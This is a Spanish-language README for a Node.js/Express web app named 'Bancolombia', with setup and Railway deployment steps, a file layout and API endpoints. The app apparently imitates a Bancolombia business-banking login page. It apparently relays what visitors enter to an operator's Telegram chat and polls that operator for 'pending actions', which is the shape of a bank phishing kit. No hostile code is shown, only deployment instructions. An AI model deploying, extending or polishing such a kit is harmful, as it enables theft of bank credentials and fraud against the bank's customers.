# Bancolombia - Proyecto Node.js

Aplicación web con backend Node.js/Express optimizada para despliegue en Railway.

## 🚀 Características

- ✅ Backend Node.js con Express
- ✅ Integración con Telegram Bot
- ✅ Sistema de sesiones persistentes
- ✅ Optimizado para Railway
- ✅ Configuración de producción lista

## 📋 Requisitos Previos

- Node.js >= 18.0.0
- npm >= 9.0.0
- Cuenta de GitHub
- Cuenta de Railway
- Bot de Telegram configurado

## 🛠️ Instalación Local

1. Clonar el repositorio:
```bash
git clone https://github.com/cabrongerson0-rgb/sucursalpymes-holld.git
cd sucursalpymes-holld
```

2. Instalar dependencias:
```bash
npm install
```

3. Configurar variables de entorno:
```bash
cp .env.example .env
```

4. Editar el archivo `.env` con tus credenciales:
```env
PORT=3000
SESSION_SECRET=tu_clave_secreta_aqui
TELEGRAM_BOT_TOKEN=tu_token_de_bot
TELEGRAM_CHAT_ID=tu_chat_id
NODE_ENV=development
```

5. Iniciar servidor de desarrollo:
```bash
npm run dev
```

El servidor estará corriendo en `http://localhost:3000`

## 🚢 Despliegue en Railway

### Opción 1: Desde GitHub (Recomendado)

1. **Preparar repositorio de GitHub:**
```bash
# Asegúrate de estar en la carpeta del proyecto
cd c:\Users\Hansel\Desktop\BANCOL2

# Inicializar git (si no está inicializado)
git init

# Agregar el repositorio remoto
git remote add origin https://github.com/cabrongerson0-rgb/sucursalpymes-holld.git

# Agregar todos los archivos
git add .

# Hacer commit
git commit -m "Deploy optimizado para Railway"

# Subir a GitHub
git push -u origin main
```

2. **Conectar con Railway:**
   - Ve a [railway.app](https://railway.app)
   - Click en "New Project"
   - Selecciona "Deploy from GitHub repo"
   - Selecciona el repositorio `cabrongerson0-rgb/sucursalpymes-holld`
   - Railway detectará automáticamente que es un proyecto Node.js

3. **Configurar Variables de Entorno en Railway:**
   - Ve a tu proyecto en Railway
   - Click en "Variables"
   - Agrega las siguientes variables:
     ```
     SESSION_SECRET=tu_clave_secreta_super_segura
     TELEGRAM_BOT_TOKEN=tu_token_de_bot
     TELEGRAM_CHAT_ID=tu_chat_id
     NODE_ENV=production
     ```
   - **IMPORTANTE:** Railway asigna automáticamente la variable `PORT`, no la necesitas configurar

4. **Deploy automático:**
   - Railway detectará los archivos `railway.json` y `nixpacks.toml`
   - El despliegue iniciará automáticamente
   - Obtendrás una URL como: `https://tu-proyecto.up.railway.app`

### Opción 2: Desde Railway CLI

```bash
# Instalar Railway CLI
npm install -g @railway/cli

# Login
railway login

# Inicializar proyecto
railway init

# Deploy
railway up
```

## 📁 Estructura del Proyecto

```
.
├── index.html              # Página principal (raíz)
├── server.js               # Servidor Express
├── package.json            # Dependencias
├── railway.json            # Configuración Railway
├── nixpacks.toml           # Build configuration
├── .env.example            # Variables de entorno ejemplo
├── .gitignore              # Archivos ignorados
└── public/                 # Recursos estáticos
    ├── index.html          # Login/App
    ├── next-step.html
    └── assets/
        ├── css/
        └── js/
```

## 🔒 Seguridad

- ✅ Variables de entorno para datos sensibles
- ✅ `.gitignore` configurado para no subir `.env`
- ✅ Sesiones con secret key
- ✅ CORS configurado
- ✅ Validación de sesiones

## 🔧 Variables de Entorno

| Variable | Descripción | Requerido |
|----------|-------------|-----------|
| `PORT` | Puerto del servidor (Railway lo asigna) | No |
| `SESSION_SECRET` | Clave secreta para sesiones | Sí |
| `TELEGRAM_BOT_TOKEN` | Token del bot de Telegram | Sí |
| `TELEGRAM_CHAT_ID` | ID del chat de Telegram | Sí |
| `NODE_ENV` | Ambiente (production/development) | Sí |

## 📊 Endpoints API

- `GET /` - Página principal (index.html raíz)
- `POST /api/process` - Procesar documento
- `POST /api/send-message` - Enviar mensaje a Telegram
- `GET /api/check-action` - Verificar acciones pendientes
- `/public/*` - Archivos estáticos

## 🐛 Troubleshooting

### El proyecto no inicia en Railway
- Verifica que todas las variables de entorno estén configuradas
- Revisa los logs en Railway Dashboard
- Asegúrate de que `railway.json` y `nixpacks.toml` estén en la raíz

### Error de sesiones
- Verifica que `SESSION_SECRET` esté configurado
- En Railway, asegúrate de usar variables de entorno persistentes

### Error con Telegram
- Verifica que `TELEGRAM_BOT_TOKEN` sea válido
- Verifica que `TELEGRAM_CHAT_ID` sea correcto
- El bot debe tener permisos para enviar mensajes

## 📝 Scripts Disponibles

```bash
npm start       # Iniciar servidor de producción
npm run dev     # Iniciar servidor de desarrollo con nodemon
```

## 🔄 Actualizaciones

Para actualizar el proyecto en Railway después de hacer cambios:

```bash
git add .
git commit -m "Descripción de cambios"
git push origin main
```

Railway detectará automáticamente los cambios y re-desplegará.

## 📞 Soporte

Si encuentras problemas durante el despliegue:
1. Revisa los logs de Railway
2. Verifica las variables de entorno
3. Asegúrate de que el proyecto compile localmente primero

## 📄 Licencia

Este proyecto es privado.

---

**Nota:** Nunca subas tu archivo `.env` a GitHub. Usa siempre variables de entorno en Railway para datos sensibles.
